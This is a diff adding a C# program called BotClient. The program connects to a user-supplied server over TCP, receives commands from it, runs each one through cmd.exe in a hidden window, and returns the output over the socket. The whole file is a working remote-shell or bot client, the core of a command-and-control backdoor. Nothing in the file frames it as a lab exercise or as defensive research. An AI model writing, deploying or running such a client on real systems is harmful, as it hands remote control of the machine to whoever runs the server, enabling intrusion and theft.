@@ -1,0 +1,90 @@
+using System;
+using System.Net.Sockets;
+using System.Text;
+
+class BotClient
+{
+    static void Main(string[] args)
+    {
+        Console.Write("Enter server address (e.g., 127.0.0.1 for localhost): ");
+        string serverAddress = Console.ReadLine();
+
+        Console.Write("Enter server port: ");
+        int serverPort = int.Parse(Console.ReadLine());
+
+        try
+        {
+            using (TcpClient client = new TcpClient(serverAddress, serverPort))
+            {
+                NetworkStream stream = client.GetStream();
+                Console.WriteLine("Connected to server.");
+
+                while (true)
+                {
+                    try
+                    {
+                        // Read the command from the server
+                        byte[] buffer = new byte[1024];
+                        int bytesRead = stream.Read(buffer, 0, buffer.Length);
+
+                        if (bytesRead > 0)
+                        {
+                            string command = Encoding.ASCII.GetString(buffer, 0, bytesRead).Trim();
+                            Console.WriteLine($"Received command: '{command}'");
+
+                            // Execute the command
+                            string result = ExecuteCommand(command);
+
+                            // Send the result back to the server
+                            byte[] resultBytes = Encoding.ASCII.GetBytes(result);
+                            stream.Write(resultBytes, 0, resultBytes.Length);
+                            stream.Flush();
+                        }
+                    }
+                    catch (Exception ex)
+                    {
+                        Console.WriteLine($"Error while processing command: {ex.Message}");
+                    }
+                }
+            }
+        }
+        catch (Exception ex)
+        {
+            Console.WriteLine($"Error: {ex.Message}");
+        }
+    }
+
+    private static string ExecuteCommand(string command)
+    {
+        try
+        {
+            System.Diagnostics.ProcessStartInfo processInfo = new System.Diagnostics.ProcessStartInfo("cmd.exe", $"/C {command}")
+            {
+                RedirectStandardOutput = true,
+                RedirectStandardError = true,
+                UseShellExecute = false,
+                CreateNoWindow = true
+            };
+
+            using (System.Diagnostics.Process process = System.Diagnostics.Process.Start(processInfo))
+            {
+                string output = process.StandardOutput.ReadToEnd();
+                string error = process.StandardError.ReadToEnd();
+
+                if (!string.IsNullOrEmpty(output))
+                {
+                    return output;
+                }
+                if (!string.IsNullOrEmpty(error))
+                {
+                    return $"Error executing command: {error}";
+                }
+                return "Command executed successfully.";
+            }
+        }
+        catch (Exception ex)
+        {
+            return $"Error executing command: {ex.Message}";
+        }
+    }
+}
